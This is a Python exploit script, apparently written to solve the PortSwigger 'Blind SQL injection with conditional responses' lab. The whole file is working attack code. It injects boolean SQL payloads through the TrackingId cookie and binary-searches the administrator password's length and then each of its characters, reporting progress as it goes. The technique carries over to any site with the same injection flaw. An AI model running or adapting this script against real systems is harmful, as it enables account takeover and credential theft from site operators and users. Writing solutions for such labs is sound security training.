import argparse
import signal
import sys
import time

import requests
from pwn import log
from termcolor import colored

global TGT_URL 
LEN_PAYLOAD = "' OR LENGTH((SELECT password FROM users WHERE username='administrator'))<=<MID> --"
PWD_PAYLOAD = "' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),<POSITION>,1))<=<MID> --"

def exit_handler(sig,grame):
    print(colored(f"\n\n[-] SQLi Attack Stopped", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, exit_handler)

def send_payload(payload):
    cookies = {"TrackingId": payload}

    req = requests.get(TGT_URL, cookies = cookies)

    return "welcome back" in req.text.lower()

def do_sqli_binsearch(sql, lo, hi, replacements = {}):

    while lo < hi:
        mid = (lo + hi) // 2

        payload = sql

        replacements_copy = replacements
        replacements_copy["<MID>"] = str(mid)

        for old_substring, new_substring in replacements_copy.items():
            payload = payload.replace(old_substring, new_substring)

        payload_ok = send_payload(payload)
        
        if payload_ok:
            hi = mid
        else:
            lo = mid + 1
    
    return lo

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script to solve the \"Blind SQL injection with conditional responses\" PortSwigger lab.")
    parser.add_argument("url", help="Target URL (e.g., https://example.web-security-academy.net)")

    args = parser.parse_args()

    TGT_URL = args.url

    pwd_len_prog = log.progress("Password Length")
    
    pwd_len_prog.status("Performing Binary Search to find the Password Length...")

    pwd_len = do_sqli_binsearch(LEN_PAYLOAD, 8, 30)

    pwd_len_prog.success(pwd_len)

    pwd_prog = log.progress("Password")
    
    pwd_prog.status("Performing Binary Search to find the Password...")
    time.sleep(2)

    password = ""

    for position in range(1, pwd_len + 1):
        password += chr(do_sqli_binsearch(PWD_PAYLOAD, 32, 126, {"<POSITION>": str(position)}))
        pwd_prog.status(f"{password} ( {int((position / pwd_len) * 100)}% |  {pwd_len - position} chars left... )")
    
    pwd_prog.success(password)
